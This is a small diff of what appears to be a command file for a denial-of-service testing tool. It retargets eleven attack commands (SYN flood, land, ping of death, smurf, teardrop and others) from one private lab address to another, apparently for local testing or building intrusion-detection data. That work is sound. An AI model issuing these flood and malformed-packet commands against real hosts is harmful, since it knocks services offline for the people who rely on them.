@@ -1,11 +1,11 @@
-dos syn 192.168.118.137 80
-dos back 192.168.118.137 
-dos land 192.168.118.137 80
-dos pod 192.168.118.137
-dos smurf 192.168.118.137
-dos teardrop 192.168.118.137 0
-dos teardrop 192.168.118.137 1
-dos teardrop 192.168.118.137 2
-dos teardrop 192.168.118.137 3
-dos teardrop 192.168.118.137 4
-dos teardrop 192.168.118.137 5
+dos syn 192.168.147.145 80
+dos back 192.168.147.145
+dos land 192.168.147.145 80
+dos pod 192.168.147.145
+dos smurf 192.168.147.145
+dos teardrop 192.168.147.145 0
+dos teardrop 192.168.147.145 1
+dos teardrop 192.168.147.145 2
+dos teardrop 192.168.147.145 3
+dos teardrop 192.168.147.145 4
+dos teardrop 192.168.147.145 5
